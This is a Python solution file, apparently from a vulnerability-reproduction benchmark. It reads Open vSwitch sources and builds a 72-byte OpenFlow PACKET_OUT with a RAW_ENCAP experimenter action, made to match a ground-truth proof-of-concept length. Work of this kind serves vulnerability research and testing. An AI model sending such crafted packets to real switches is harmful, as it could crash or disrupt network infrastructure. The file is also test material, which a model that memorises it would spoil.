import os
import tarfile
import re
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        vendor_id = self._extract_vendor_id(src_path) or 0x2320
        subtype = self._extract_raw_encap_subtype(src_path) or 46

        # Build OpenFlow 1.0 OFPT_PACKET_OUT with one NX vendor action (RAW_ENCAP)
        # Target total packet length: 72 bytes as per ground-truth.
        # Layout:
        # - ofp_header (8)
        # - buffer_id (4)
        # - in_port (2)
        # - actions_len (2)
        # - actions (NX RAW_ENCAP)
        #   - nx_action_header (16)
        #   - ed_prop header (4)
        #   - ed_prop data (variable)
        # Ensure NX action length (including header and property) is multiple of 8

        ofp10_packet_out_header_len = 8 + 4 + 2 + 2  # 16 bytes
        nx_header_len = 16
        ed_prop_header_len = 4

        target_total_len = 72
        nx_body_len = target_total_len - ofp10_packet_out_header_len  # actions length
        # Ensure nx_body_len >= nx_header_len + ed_prop_header_len
        if nx_body_len < nx_header_len + ed_prop_header_len:
            nx_body_len = nx_header_len + ed_prop_header_len

        # Ensure actions length is multiple of 8
        if nx_body_len % 8 != 0:
            nx_body_len += (8 - (nx_body_len % 8))

        ed_prop_data_len = nx_body_len - nx_header_len - ed_prop_header_len
        if ed_prop_data_len < 0:
            ed_prop_data_len = 0

        # Build NX action header: type=OFPAT_EXPERIMENTER(0xffff), len, vendor, subtype, pad(6)
        nx_type = 0xFFFF
        nx_len = nx_header_len + ed_prop_header_len + ed_prop_data_len

        nx_header = struct.pack("!HHLH6x", nx_type, nx_len, vendor_id, subtype)

        # Build a simple ED property: type=0, len=ed_prop_header_len + data_len
        ed_prop_len = ed_prop_header_len + ed_prop_data_len
        ed_prop_type = 0
        ed_prop_hdr = struct.pack("!HH", ed_prop_type, ed_prop_len)
        ed_prop_data = b"\x00" * ed_prop_data_len

        nx_action = nx_header + ed_prop_hdr + ed_prop_data

        # Build OFPT_PACKET_OUT (OpenFlow 1.0)
        version = 0x01
        msg_type = 13  # OFPT_PACKET_OUT
        total_len = ofp10_packet_out_header_len + len(nx_action)
        xid = 0

        ofp_header = struct.pack("!BBHL", version, msg_type, total_len, xid)
        buffer_id = 0xFFFFFFFF
        in_port = 0
        actions_len = len(nx_action)

        pkt_out_hdr = struct.pack("!IHH", buffer_id, in_port, actions_len)

        poc = ofp_header + pkt_out_hdr + nx_action

        # Trim or pad to exactly 72 bytes to match ground-truth length if possible
        if len(poc) < target_total_len:
            poc += b"\x00" * (target_total_len - len(poc))
        elif len(poc) > target_total_len:
            # If longer due to alignment, it's acceptable, but try to trim trailing zeros safely
            poc = poc[:target_total_len]

        return poc

    def _extract_vendor_id(self, src_path: str):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if not (m.name.endswith(".h") or m.name.endswith(".c")):
                        continue
                    try:
                        data = tf.extractfile(m).read().decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    for pat in [r"#\s*define\s+NX_VENDOR_ID\s+([0-9xa-fA-F]+)",
                                r"#\s*define\s+OVS_VENDOR_ID\s+([0-9xa-fA-F]+)"]:
                        mo = re.search(pat, data)
                        if mo:
                            val = mo.group(1)
                            try:
                                return int(val, 0)
                            except Exception:
                                pass
        except Exception:
            pass
        return None

    def _extract_raw_encap_subtype(self, src_path: str):
        # Try direct define or enum assignment
        try:
            all_texts = []
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if not (m.name.endswith(".h") or m.name.endswith(".c")):
                        continue
                    try:
                        data = tf.extractfile(m).read().decode("utf-8", errors="ignore")
                        all_texts.append(data)
                    except Exception:
                        continue
            combined = "\n".join(all_texts)

            # Direct define
            m = re.search(r"#\s*define\s+NXAST_RAW_ENCAP\s+([0-9xa-fA-F]+)", combined)
            if m:
                try:
                    return int(m.group(1), 0)
                except Exception:
                    pass

            # Enum assignment with explicit value
            m = re.search(r"NXAST_RAW_ENCAP\s*=\s*([0-9xa-fA-F]+)", combined)
            if m:
                try:
                    return int(m.group(1), 0)
                except Exception:
                    pass

            # Parse enums containing NXAST_* to infer values
            cleaned = self._strip_c_comments(combined)
            for em in re.finditer(r"enum\s+[a-zA-Z_]\w*\s*\{(.*?)\}", cleaned, flags=re.DOTALL):
                body = em.group(1)
                if "NXAST_" not in body:
                    continue
                # Split by commas at top level
                enumerators = []
                start = 0
                depth = 0
                for i, ch in enumerate(body):
                    if ch == '{':
                        depth += 1
                    elif ch == '}':
                        depth -= 1
                    elif ch == ',' and depth == 0:
                        enumerators.append(body[start:i].strip())
                        start = i + 1
                tail = body[start:].strip()
                if tail:
                    enumerators.append(tail)

                current_val = -1
                mapping = {}
                for enum_def in enumerators:
                    if not enum_def:
                        continue
                    # Remove potential trailing comments or attributes
                    enum_def = enum_def.strip()
                    if not enum_def:
                        continue
                    # Split name and optional assignment
                    if '=' in enum_def:
                        name, expr = enum_def.split('=', 1)
                        name = name.strip()
                        expr = expr.strip()
                        val = self._eval_simple_int_expr(expr, mapping)
                        if val is None:
                            # Fallback: try plain int
                            try:
                                val = int(expr, 0)
                            except Exception:
                                # If can't evaluate, skip
                                continue
                        current_val = val
                        mapping[name] = current_val
                    else:
                        name = enum_def.strip()
                        current_val += 1
                        mapping[name] = current_val
                if "NXAST_RAW_ENCAP" in mapping:
                    return mapping["NXAST_RAW_ENCAP"]
        except Exception:
            pass
        return None

    def _strip_c_comments(self, s: str) -> str:
        # Remove /* ... */ and // ... comments
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
        s = re.sub(r"//.*?$", "", s, flags=re.MULTILINE)
        return s

    def _eval_simple_int_expr(self, expr: str, mapping: dict) -> int or None:
        # Evaluate simple integer expressions: literals, hex, +/- and shift (<<, >>),
        # identifiers in mapping.
        try:
            # Replace identifiers with their values if known
            tokens = re.findall(r"[A-Za-z_]\w+|0x[0-9A-Fa-f]+|\d+|<<|>>|[\+\-\*/\|\&\(\)]", expr)
            if not tokens:
                return None
            converted = []
            for tok in tokens:
                if re.match(r"0x[0-9A-Fa-f]+|\d+$", tok):
                    converted.append(tok)
                elif tok in ("<<", ">>", "+", "-", "*", "/", "|", "&", "(", ")"):
                    converted.append(tok)
                else:
                    if tok in mapping:
                        converted.append(str(mapping[tok]))
                    else:
                        # Unknown identifier, abort
                        return None
            eval_expr = "".join(converted)
            return int(eval(eval_expr, {"__builtins__": {}}, {}))
        except Exception:
            return None